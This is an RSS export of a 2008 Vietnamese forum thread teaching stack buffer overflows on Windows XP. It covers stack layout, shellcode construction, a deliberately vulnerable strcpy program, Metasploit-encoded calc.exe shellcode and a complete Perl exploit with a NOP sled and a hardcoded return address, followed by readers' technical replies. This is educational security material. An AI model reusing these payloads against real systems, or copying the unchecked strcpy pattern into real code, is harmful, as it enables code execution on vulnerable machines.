@@ -1,0 +1,753 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Tìm hiểu lỗi Buffer Overflow trên Windows"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Tìm hiểu lỗi Buffer Overflow trên Windows"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <font color='orange'><b><font size='+1'>I. CHƯƠNG TRÌNH KHI NẠP TRONG BỘ NHỚ</font></b></font>
+Khi những tiến trình được nạp đến bộ nhớ, chúng chia thành 6 phân đoạn như sau:
+<b>1) Phân đoạn .text</b>
+Phân đoạn này tương ứng là phần của file thực thi nhị phân. Nó chứa các chỉ thị lệnh (mã máy) để thực hiện các tác vụ của chương trình. Phân đoạn này được đánh dấu là chỉ đọc và sẽ gây ra lỗi nếu như ghi trên phân đoạn này. Kích thước là cố định tại lúc thực thi khi tiến trình lần đầu tiên được nạp.
+<b>2) Phân đoạn .data</b>
+Là phân đoạn được sử dụng để lưu trữ các biến toàn cục và có khởi tạo giá trị ban đầu như là: int a=0;
+Kích thước này cũng có định tại lúc thực thi chương trình
+<b>3) Phân đoạn .bss</b>
+Below stack section (.bss) là được sử dụng để lưu trữ các biến toàn cục nhưng không có khởi tạo giá trị ban đâu như là : int a;
+Kích thước của phân đoạn này cũng cố định lúc thực thi chương trình.
+<b>4) Phân đoạn Heap</b>
+Phân đoạn này được sử dụng để cấp phát các biến động và phát triển từ vùng địa chỉ thấp đến vùng địa chỉ cao trong bộ nhớ. Trong ngôn ngữ C thì việc cấp phát và giải phóng được thực hiện qua hai hàm malloc() và free(). Ví dụ:
+int i = malloc(sizeof (int));
+<b>5) Phân đoạn Stack</b>
+Phân đoạn stack có tác dụng giữ những lời gọi hàm trong thủ tục đệ quy và phát triển theo địa chỉ vùng nhớ cao đến địa chỉ vùng nhớ thấp trên hầu hết các hệ thống. 
+<b>6) Phân đoạn biến môi trường và đối số</b>
+Phân đoạn này lưu trữ một bản sao chép các biến cấp độ hệ thống mà có thể được yêu cầu bởi tiến trình trung quá trình thực thi. Phân đoạn này có khả năng ghi được.
+ 
+<br>
+			<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h1-1.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+Ví dụ một đoạn chương trình 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/* memory.c */ // this comment simply holds the program name
+int index = 5; // giá trị này được lưu tại phân đoạn data bởi vì nó có giá trị khởi tạo.
+
+char * str; // giá trị này được lưu tại phân đoạn bss vì nó không có giá trị khởi tạo ban đầu.
+
+void funct1&#40;int c&#41;{ // bracket starts function1 block
+int i=c; // được lưu trong phân đoạn stack.
+
+str = &#40;char*&#41; malloc &#40;10 * sizeof &#40;char&#41;&#41;; // Dành 10 ký tự trong vùng nhớ Heap.
+strncpy&#40;str, "abcde", 5&#41;; //copies 5 characters "abcde" into str
+} //end of function1
+void main &#40;&#41;{ //the required main function
+funct1&#40;1&#41;; //main calls function1 with an argument
+} //end of the main function</pre>
+		</div>
+<font color='orange'><b><font size='+1'>II. GIẢI THÍCH CƠ CHẾ LÀM VIỆC CỦA NGĂN XẾP (STACK)</font></b></font>
+<b>1) Cho đoạn chương trình sau</b>:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>int f&#40;int a,int b,int c&#41;;
+int main&#40;&#41;
+{
+	f&#40;1,2,3&#41;;
+	return 0;
+}
+int f&#40;int a,int b,int c&#41;
+{
+	int i;
+	char buf&#91;3&#93;;
+	i=5;
+	buf&#91;0&#93;='A';
+	buf&#91;1&#93;='B'; 
+	buf&#91;2&#93;='C';
+	return &#40;a+i&#41;;
+}</pre>
+		</div>
+
+<b>2) Mã Assembly của hai hàm trên như sau:</b>
+
+<br>
+			<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h2.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<b>3) Giải thích mã Assembly của chương trình</b>
+Khi hệ thống chuyển điều khiển cho chương trình nó sẽ lưu địa chỉ trở về như sau
+	push	ebp
+	mov	ebp,esp
+Khi gọi hàm f(1,2,3) với ba đối số kiểu int thì các bước chuẩn bị để gọi hàm như sau
+a) Đẩy các tham số của hàm vào stack theo thứ tự sau
+		push	3
+		push	2
+		push	1
+- Tại sao nó lại đẩy theo thứ tự như vậy, bởi vì cơ chế làm việc của stack là vào sau ra trước. Như vậy khi push các tham số như trên sẽ đúng thứ tự của tham số khi gọi hàm
+b) Gọi hàm
+		call	f
+- Khi gọi hàm f thì địa chỉ câu lệnh tiếp theo của lệnh gọi hàm f sẽ được đẩy vào stack và quyền điều khiển lúc này được trao cho hàm f()
+c) Quá trình thực thi hàm f() như sau
+- Đầu tiên ebp được đẩy vào stack, lúc này esp trỏ đến địa chỉ cũ của ebp. Tiếp đến ebp được gán bởi esp. Như vậy là esp, và ebp đều trỏ đến địa chỉ cũ của ebp. Sau đó chương trình cấp phát vùng nhớ cho 4 biến cục bộ. Biến i (4 bytes) và 3 biến char mỗi biến là 1 byte. Tổng cộng là 7 bytes nhưng được làm tròn thành 8 bytes
+		push	ebp
+		mov	ebp, esp
+		sub	esp, 8
+- Sau đó các biến cục bộ được gán giá trị như sau. Đầu tiên là biến i tiếp đến là 3 kí tự
+		mov	dword ptr [ebp-4], 5
+		mov	byte ptr [ebp-8], 'A'
+		mov	byte ptr [ebp-7], 'B'
+		mov	byte ptr [ebp-6], 'C'	
+
+- EBP đang trỏ đến ô nhớ chứa giá trị EBP cũ. ESP sẽ được gán bằng EBP. Như vậy ESP đang trỏ đến ô nhớ chứa giá trị EBP cũ. Tiếp theo, lệnh pop sẽ lấy giá trị của EBP cũ vào EBP, ESP trỏ đến ô nhớ chứa địa chỉ trở về. Lệnh ret sẽ lấy địa chỉ trở về vào EIP và quyền điều khiển chương trình được chuyển giao cho hàm main(), ESP trỏ đến ô nhớ chứa tham số đầu tiên của hàm f().
+		mov	esp,ebp
+		pop	ebp
+		ret
+- Qua đoạn quá trình thực thi của hàm f ta thấy được rằng là thanh ghi ebp dùng để tham chiếu các biến cục bộ và tham số của hàm  của hàm f
+	Tham chiếu đến tham số:	ebp+???
+	Tham chiếu đến biến cục bộ	ebp-???
+Lưu ý: Vùng stack làm việc từ vùng nhớ cao đến vùng nhớ thấp tức là thanh ghi esp được trỏ ở đỉnh của ngăn xếp cho nến quá trình cấp phát ô nhớ sẽ được thực hiện từ vùng nhớ cao đến vùng nhớ thấp. Mỗi lần được cấp phát thì địa chỉ esp sẽ giảm tương ứng với kiểu của biến.
+Sơ đồ biểu diễn stack đối với chương trình trên như sau
+
+<br>
+			<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h3.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+
+<b>4) Ghi đè lên địa chỉ trở về trong ngăn xếp</b>
+Ví dụ sau đây sẽ cho thấy cách ghi đè lên địa chỉ trở về trong ngăn xếp.
+a) Ví dụ
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdio.h&gt;
+void func2&#40;&#41;
+{
+	printf&#40;"Hello everybody !\n"&#41;;
+	exit&#40;1&#41;;
+}
+void func1&#40;&#41;
+{
+	int buf&#91;1&#93;;
+	buf&#91;2&#93;=&#40;int&#41;func2;
+}
+void main&#40;&#41;
+{
+	func1&#40;&#41;;
+}</pre>
+		</div>
+Sau khi chạy chương trình nó sẽ xuất hiện trên màn hình là dòng chữ “Hello everybody”.
+Hàm func2() đã ghi đè địa chỉ trở về của hàm func1, cho nên thực hiện func2 và thóat chương trình.
+b) Giải thích
+Trong hàm main chỉ gọi mỗi hàm func1() và quy trình làm khởi tạo và làm việc của hàm func1() giống các thao tác của hàm f() trên như đã giới thiệu phần trước.
+- Đầu tiên đẩy (push) các đối số (Ở đây là không có đối số nào)
+- Sau đó là đẩy (push) địa chỉ trở về vào ngăn xếp
+- Đẩy giá trị ebp vào stack
+- Cấp phát biến cục bộ cho hàm func1(Ở đây chỉ có một biến kiểu int )
+Chú ý đến stack bây giờ có những gì trong đó có :
+	1) Địa chỉ trở về
+	2) Địa chỉ ebp cũ
+	3) Địa chỉ của biến buf mà ở đây là buf[0] (Mảng trong C được đánh số từ 0)
+Như vậy buf[0] tức là biến cục bộ của hàm test_proc, buf[1] là địa chỉ của ebp cũ, buf[2] là địa chỉ trở về của hàm
+Câu lệnh buf[2]=int func2 đã ghi đè địa chỉ trở về của hàm func1. Do đó đáng lẽ là hàm func1() sau khi thực thi xong sẽ quay về main nhưng địa chỉ trở về của nó đã bị ghi đè nên gọi tiếp hàm func2().
+
+<br>
+			<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h4.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<b><font color='orange'><font size='+1'>III. GIỚI THIỆU SHELLCODE </font></font></b>
+<b>1) Định nghĩa</b>
+Theo định nghĩa của wikipedia.org thì shellcode là “In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability”.
+<b>2) Cách tạo một shellcode</b>
+Ví dụ sau sẽ hướng dẫn cách tạo một shellcode với hàm WinExec.
+Hàm WinExec là hàm thực thi một ứng dụng, với đối số đầu vào là tên file ứng dụng và cách hiển thị khi ứng dụng được thi thực thi (thực thi ứng dụng có thể ở dạng ẩn, bình thường, …).
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Chi tiết về hàm WinExec
+UINT WINAPI WinExec&#40;
+  __in  LPCSTR lpCmdLine,
+  __in  UINT uCmdShow
+&#41;;</pre>
+		</div>
+Chi tiết về hàm có thể tham khảo tại:
+(<span class="link"> http://msdn.microsoft.com/en-us/library/ms687393(VS.85).aspx</span>)
+Giả sử sử dụng hàm WinExec để thực thi calc.exe(Calculator trong Windows) với hàm WinExec. Khi viết bằng ngôn ngữ C thì nó sẽ như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;windows.h&gt;
+int main&#40;&#41;
+{
+	char fname&#91;10&#93;="calc";
+	WinExec&#40;fname,1&#41;;
+	return 0;
+}</pre>
+		</div>
+Với cách gọi hàm WinExec như trên thì khi viết lại bằng ngôn ngữ Assembly for Windows thì dựa theo cách đã trình bày ở phần II được viết như sau:
+Trước hết cần biết địa chỉ của hàm WinExec trong thư viện kernel32.dll.
+Đoạn mã sau cho biết địa chỉ của một hàm trong một thư viện đã chỉ định
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main&#40;int argc,char *argv&#91;&#93;&#41;
+{
+	if &#40;argc&lt;3&#41;
+	{
+		printf&#40;"Cu phap: %s &lt;Ten dll&gt; &lt;Ten ham&gt; \n",argv&#91;0&#93;&#41;;
+		printf&#40;"Vi du: %s kernel32.dll WinExec",argv&#91;0&#93;&#41;;
+		return 0;
+	}
+	HINSTANCE hDll;
+	hDll=LoadLibrary&#40;argv&#91;1&#93;&#41;;
+	if &#40;hDll!=0&#41;
+	{
+		FARPROC	fp;
+		fp=GetAddressProc&#40;hDll,argv&#91;2&#93;&#41;
+		if &#40;fp!=0&#41;
+			printf&#40;"Dia chi cua ham %s la : 0x%x",argv&#91;1&#93;,fp&#41;;
+		else
+			printf&#40;"Khong tim thay ham %s trong thu vien %s",argv&#91;2&#93;,argv&#91;1&#93;&#41;;
+	}
+}</pre>
+		</div>
+Sau khi biên dịch và chạy đoạn chương trình trên với đối số là tên thư viện và hàm WinExec có kết quả hàm WinExec ở tại: 0x7c86114d (WindowsXp SP2) và hàm ExitProcess tại địa chỉ 0x7c81caa2 (WindowsXp SP2).
+Đoạn mã Assembly như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>void main&#40;&#41;
+{
+	__asm{
+		xor	eax,eax
+		push	eax
+		sub	esp,4
+		mov	&#91;ebp-8&#93;,'c'
+		mov	&#91;ebp-7&#93;,'a'
+		mov	&#91;ebp-6&#93;,'l'
+		mov	&#91;ebp-5&#93;,'c'
+		push 	eax
+		lea	eax,&#91;ebp-8&#93;
+		push	eax
+		mov	eax,0x7c86114d
+	 	call	eax
+		mov	eax,0x7c81caa2
+		call	eax
+	}
+}</pre>
+		</div>
+Khi biên dịch và chạy với mã Assembly trên thì không khác gì với việc hàm viết trong C. Nhưng ở đây được viết bằng Assembly for Windows. Sở dĩ phải viết hàm bằng ngôn ngữ Assembly vì cho phép nắm rõ cách tạo hàm và gọi hàm trong Assembly for Windows và lấy được mã máy khi sử dụng chương trình OllyDbg, sau đây là mã máy của đoạn Assembly trên.
+
+ 
+<br>
+			<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h5.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+Trên hình vẽ sẽ có được mã máy tương ứng với mã Assembly, bây giờ xây dựng shellcode và thực thi từ mã máy này như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>unsigned char scode&#91;&#93; =
+"\x55\x8B\xEC\x33\xC0\x50\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x61\xC6\x45\xFA\x6C\xC6\x45\xFB\x63\x50\x8D\x45\xF8\x50\xB8\x4D\x11\x86\x7C\xFF\xD0\xB8\xA2\xCA\x81\x7C\xFF\xD0\x5D\xC3";
+int main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+	int *ret;
+	ret=&#40;int *&#41;&ret+2;// Ghi đè địa chỉ trở về của hàm main
+	&#40;*ret&#41;=&#40;int&#41;scode;// Giá trị của con trỏ ret trỏ đến là giá trị của biến scode
+	return 0;
+}</pre>
+		</div>
+
+Với cách trên hướng dẫn tự tạo shellcode riêng, tuy nhiên một site chuyên cung cấp các loại shellcode nổi tiếng cùng với framework của nó là metasploit.com. Tại đây có thể tìm thấy rất nhiều loại shellcode khác nhau. Với shellcode của hàm WinExec trên có thể tìm thấy tại
+(<span class="link"> http://www.metasploit.com:55555/PAYLOADS?MODE=SELECT&MODULE=win32_exec</span>)
+/* win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub<span class="link"> http://metasploit.com</span> */
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>unsigned char scode&#91;&#93; =
+"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0d"
+"\x5a\x9f\x07\x83\xeb\xfc\xe2\xf4\xf1\xb2\xdb\x07\x0d\x5a\x14\x42"
+"\x31\xd1\xe3\x02\x75\x5b\x70\x8c\x42\x42\x14\x58\x2d\x5b\x74\x4e"
+"\x86\x6e\x14\x06\xe3\x6b\x5f\x9e\xa1\xde\x5f\x73\x0a\x9b\x55\x0a"
+"\x0c\x98\x74\xf3\x36\x0e\xbb\x03\x78\xbf\x14\x58\x29\x5b\x74\x61"
+"\x86\x56\xd4\x8c\x52\x46\x9e\xec\x86\x46\x14\x06\xe6\xd3\xc3\x23"
+"\x09\x99\xae\xc7\x69\xd1\xdf\x37\x88\x9a\xe7\x0b\x86\x1a\x93\x8c"
+"\x7d\x46\x32\x8c\x65\x52\x74\x0e\x86\xda\x2f\x07\x0d\x5a\x14\x6f"
+"\x31\x05\xae\xf1\x6d\x0c\x16\xff\x8e\x9a\xe4\x57\x65\x24\x47\xe5"
+"\x7e\x32\x07\xf9\x87\x54\xc8\xf8\xea\x39\xfe\x6b\x6e\x5a\x9f\x07";</pre>
+		</div>
+
+<b><font size='+1'><font color='orange'>III. LỖI TRÀN STACK (BUFFER OVERFLOW)</font></font></b>
+<b>1) Giới thiệu</b>
+Lỗi tràn stack xuất hiện khi bộ đệm lưu trữ giữ liệu trong bộ nhớ không kiểm soát việc ghi giá trị trên nó, dẫn đến tràn stack và việc tràn stack này dẫn đến việc ghi đè địa chỉ trở về của hàm.
+Để hiểu rõ về tràn stack như thế nào. Cho một ví dụ sau có lỗi tràn stack (buffer overflow)
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>//File vul.c
+#include &lt;stdio.h&gt;
+greeting&#40;char *temp1, char *temp2&#41; {
+char name&#91;400&#93;;
+strcpy&#40;name, temp2&#41;;
+printf&#40;"Hello %s %s\n", temp1, name&#41;;
+}
+main&#40;int argc, char *argv&#91;&#93;&#41;{
+greeting&#40;argv&#91;1&#93;, argv&#91;2&#93;&#41;;
+printf&#40;"Bye %s %s\n", argv&#91;1&#93;, argv&#91;2&#93;&#41;;
+}</pre>
+		</div>
+Nhiệm vụ của chương trình đơn giản là thực hiện nhận hai tham số và chuyển cho hàm getting(), tại hàm getting() có sử dụng một hàm strcpy có nhiệm vụ copy biến temp2 đến biến name. Tại đây biến name chỉ được cấp phát 400 byte. Do vậy nếu như biến temp2 không lớn hơn 400 thì không có việc gì xảy ra, ngược lại nếu như biến temp2 có giá trị lớn 400, thì nó sẽ lần lượt ghi đè lên địa chỉ EBP và EIP, vì sao nó lại ghi đè lên hai địa chỉ này thì như đã giới thiệu trong phần cách hoạt động của stack. Từ đây có thể khai thác lỗi tràn stack và lần lượt thực hiện viết các mã khai thác như sau:
+Giả sử lần lượt đệ trình dữ liệu cho đối số đầu vào sử dụng Perl script như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>perl -e "exec 'vul',’Mr’,&#40;'A'x400&#41;" Chương trình sẽ không xuất hiện lỗi.
+perl -e "exec 'vul',’Mr’,&#40;'A'x404&#41;" Xuất hiện lỗi do ghi đè lên địa chỉ của EBP.
+perl -e "exec 'vul',’Mr’,&#40;'A'x408&#41;" Xuất hiện lỗi do ghi đè lên địa chỉ của EIP.</pre>
+		</div>
+<b>2) Khai thác</b>
+Để khai thác lỗi tràn bộ đệm của chương trình, bộ đệm của chương trình sẽ được đổ “rác” với lệnh NOP (0x90 – lệnh không làm gì) và địa chỉ trở về EIP được ghi bởi địa chỉ của ESP. 
+Đoạn mã sau sẽ tìm địa chỉ ESP
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>get_sp&#40;&#41; { __asm mov eax, esp }
+int main&#40;&#41;{
+printf&#40;"Stack pointer &#40;ESP&#41;: 0x%x\n", get_sp&#40;&#41;&#41;;
+}</pre>
+		</div>
+Khi chạy chương trình có được địa chỉ ESP: 0x12ff68 (WindowsXP SP2). Shellcode sử dụng ở đây là shellcode có chiều dài 164byte lấy từ metasploit. Như vậy từ địa chỉ ESP ta phải trừ đi 408 byte từ địa chỉ trở về (cấp phát cho biến name, phần EBP  và EIP).
+Sơ đồ của quá trình khai thác như sau:
+<br>
+			<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h6.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+Mã khai thác được viết bằng Perl để khai thác chương trình bị lỗi tràn bộ đệm như sau
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># win32_exec - EXITFUNC=thread CMD=calc.exe Size=164 Encoder=PexFnstenvSub
+#http://metasploit.com
+my $shellcode =
+"\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb6".
+"\x9d\x6d\xaf\x83\xeb\xfc\xe2\xf4\x4a\x75\x29\xaf\xb6\x9d\xe6\xea".
+"\x8a\x16\x11\xaa\xce\x9c\x82\x24\xf9\x85\xe6\xf0\x96\x9c\x86\xe6".
+"\x3d\xa9\xe6\xae\x58\xac\xad\x36\x1a\x19\xad\xdb\xb1\x5c\xa7\xa2".
+"\xb7\x5f\x86\x5b\x8d\xc9\x49\xab\xc3\x78\xe6\xf0\x92\x9c\x86\xc9".
+"\x3d\x91\x26\x24\xe9\x81\x6c\x44\x3d\x81\xe6\xae\x5d\x14\x31\x8b".
+"\xb2\x5e\x5c\x6f\xd2\x16\x2d\x9f\x33\x5d\x15\xa3\x3d\xdd\x61\x24".
+"\xc6\x81\xc0\x24\xde\x95\x86\xa6\x3d\x1d\xdd\xaf\xb6\x9d\xe6\xc7".
+"\x8a\xc2\x5c\x59\xd6\xcb\xe4\x57\x35\x5d\x16\xff\xde\x72\xa3\x4f".
+"\xd6\xf5\xf5\x51\x3c\x93\x3a\x50\x51\xfe\x0c\xc3\xd5\xb3\x08\xd7".
+"\xd3\x9d\x6d\xaf";
+# Từ địa chỉ 0x12ff68-0x198&#40;408 bytes&#41;
+my $return_address = "\x68\xFF\x12\x00";
+my $nop_before = "\x90" x 24;
+my $nop_after = "\x90" x 216;
+my $payload = $nop_before.$shellcode.$nop_after.$return_address;
+exec 'vul',$payload</pre>
+		</div>
+
+<font color='orange'><font size='+1'><b>IV. CÔNG CỤ VÀ TÀI LIỆU THAM KHẢO</b></font></font>
+<b>1) Công cụ</b>
+	- OllyDbg – <span class="link"> http://www.ollydbg.de</span>. Thanks <b><font color='orange'>hacknho </font></b>với bản Ollydbg patched :-* :-* :-*
+<b>2) Tài liệu</b>
+- “Gray Hat Hacking, Second Edition” - Shon Harris, Allen Harper, Chris Eagle, and Jonathan Ness.
+- Metasploit (<span class="link"> http://metasploit.com</span>).
+
+Xong phần I !!! :D :D :D  -:|-  -:|- . Phần II seamoun sẽ nói rõ hơn về cách khai thác và demo khai thác một ứng dụng bị lỗi buffer overflow.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158915</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158915</link>
+				<pubDate><![CDATA[Fri, 14 Nov 2008 18:05:18]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">seamoun wrote:</cite><br>
+		<blockquote>
+<b>1) Công cụ</b>
+	- OllyDbg – <span class="link"> http://www.ollydbg.de</span>. Thanks <b><font color='orange'>hacknho </font></b>với bản Ollydbg patched :-* :-* :-*
+<b>2) Tài liệu</b>
+- “Gray Hat Hacking, Second Edition” - Shon Harris, Allen Harper, Chris Eagle, and Jonathan Ness.
+- Metasploit (<span class="link"> http://metasploit.com</span>).
+&nbsp;
+		</blockquote>
+<font color='orange'>hacnho</font> chứ không phải <font color='orange'>hacknho</font> bác ơi. 
+Bài viết công phu quá, mong phần tiếp theo của bác  :x ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158927</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158927</link>
+				<pubDate><![CDATA[Fri, 14 Nov 2008 19:21:15]]> GMT</pubDate>
+				<author><![CDATA[ secmask]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Có bản pdf attach lên cho anh em tiện download về đọc không bác seamoun :)
+
+Regards]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158928</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158928</link>
+				<pubDate><![CDATA[Fri, 14 Nov 2008 19:25:03]]> GMT</pubDate>
+				<author><![CDATA[ kienmanowar]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ pdf đây bác: <span class="link"> http://www.mediafire.com/?sharekey=b18b682d8469f2c4ab1eab3e9fa335caf58b3d419a46c925</span>
+nhưng em thấy đọc trên nền HVA dịu mắt hơn đó]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158930</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158930</link>
+				<pubDate><![CDATA[Fri, 14 Nov 2008 19:50:39]]> GMT</pubDate>
+				<author><![CDATA[ protectHat]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Có một vài câu hỏi muốn trao đổi với bạn Seamoun:
+1. Bài này là "Tìm hiểu lỗi Buffer Overflow trên Windows" nhưng cái bạn minh họa là vùng nhớ của một process trên Linux
+2. 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># win32_exec - EXITFUNC=thread CMD=calc.exe Size=164 Encoder=PexFnstenvSub
+ #http://metasploit.com
+ my $shellcode =
+ "\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb6".
+ "\x9d\x6d\xaf\x83\xeb\xfc\xe2\xf4\x4a\x75\x29\xaf\xb6\x9d\xe6\xea".
+ "\x8a\x16\x11\xaa\xce\x9c\x82\x24\xf9\x85\xe6\xf0\x96\x9c\x86\xe6".
+ "\x3d\xa9\xe6\xae\x58\xac\xad\x36\x1a\x19\xad\xdb\xb1\x5c\xa7\xa2".
+ "\xb7\x5f\x86\x5b\x8d\xc9\x49\xab\xc3\x78\xe6\xf0\x92\x9c\x86\xc9".
+ "\x3d\x91\x26\x24\xe9\x81\x6c\x44\x3d\x81\xe6\xae\x5d\x14\x31\x8b".
+ "\xb2\x5e\x5c\x6f\xd2\x16\x2d\x9f\x33\x5d\x15\xa3\x3d\xdd\x61\x24".
+ "\xc6\x81\xc0\x24\xde\x95\x86\xa6\x3d\x1d\xdd\xaf\xb6\x9d\xe6\xc7".
+ "\x8a\xc2\x5c\x59\xd6\xcb\xe4\x57\x35\x5d\x16\xff\xde\x72\xa3\x4f".
+ "\xd6\xf5\xf5\x51\x3c\x93\x3a\x50\x51\xfe\x0c\xc3\xd5\xb3\x08\xd7".
+ "\xd3\x9d\x6d\xaf";
+ # Từ địa chỉ 0x12ff68-0x198&#40;408 bytes&#41;
+ my $return_address = "\x68\xFF\x12\x00";
+ my $nop_before = "\x90" x 24;
+ my $nop_after = "\x90" x 216;
+ my $payload = $nop_before.$shellcode.$nop_after.$return_address;
+ exec 'vul',$payload</pre>
+		</div>
+--------&gt; Mình ko hiểu tại sao bạn nhét thêm khúc $nop_after trong payload đằng sau shellcode làm gì? Nó đâu có tác dụng "trượt" về shellcode nếu chẳng may $return_address trỏ về nó ??
+
+Thêm nữa 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>my $return_address = "\x68\xFF\x12\x00";</pre>
+		</div>
+----&gt; theo mình nên bỏ cái \x00 đằng sau đi thành
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>my $return_address = "\x68\xFF\x12"</pre>
+		</div>
+ vi strcpy gặp nó coi nó như terminate của chuỗi nên ko có tác dùng gì.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158971</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158971</link>
+				<pubDate><![CDATA[Sat, 15 Nov 2008 02:27:26]]> GMT</pubDate>
+				<author><![CDATA[ megatron]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ megatron,
+
+Cái NOP phía sau shellcode có lẽ là để 'padd' cái shellcode cho đúng size + bảo vệ cái shellcode khi sử dụng stack. khoai có bị vài lần: buffer khá nhỏ, nhưng vì không để ý nên để NOP sled phía trước hơi nhiều. Kết quả, sau vài cú push là stack overwrite cái shellcode, dẫn đến bị illegal instruciton.
+
+khoai cũng không hiểu cái return address. $return_address = "\x68\xff\x12\x00" có nghĩa là address sẽ là 0x0012ff68? Nhưng nếu bỏ 00 ở phía sau thì return address (đủ 4bytes) sẽ là 0x12ff6800. Anh seamoun giải thích thêm cái này dùm em.
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158984</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#158984</link>
+				<pubDate><![CDATA[Sat, 15 Nov 2008 04:13:54]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>megatron,
+
+Cái NOP phía sau shellcode có lẽ là để 'padd' cái shellcode cho đúng size + bảo vệ cái shellcode khi sử dụng stack. khoai có bị vài lần: buffer khá nhỏ, nhưng vì không để ý nên để NOP sled phía trước hơi nhiều. Kết quả, sau vài cú push là stack overwrite cái shellcode, dẫn đến bị illegal instruciton.
+khoai&nbsp;
+		</blockquote>
+Mr.Khoai,
+Thêm NOP sled vào để fill đúng cái size thì ko nói, nhưng mà ko hiểu ý của Khoai "bảo vệ shellcode" là sao? stack PUSH hay POP trong trường hợp này đâu có dính dáng gì đến buffer. Khoai có thể viết ra cái case study mà Khoai đã gặp đc ko?
+
+<blockquote>khoai cũng không hiểu cái return address. $return_address = "\x68\xff\x12\x00" có nghĩa là address sẽ là 0x0012ff68? Nhưng nếu bỏ 00 ở phía sau thì return address (đủ 4bytes) sẽ là 0x12ff6800. Anh seamoun giải thích thêm cái này dùm em.
+&nbsp;
+		</blockquote> 
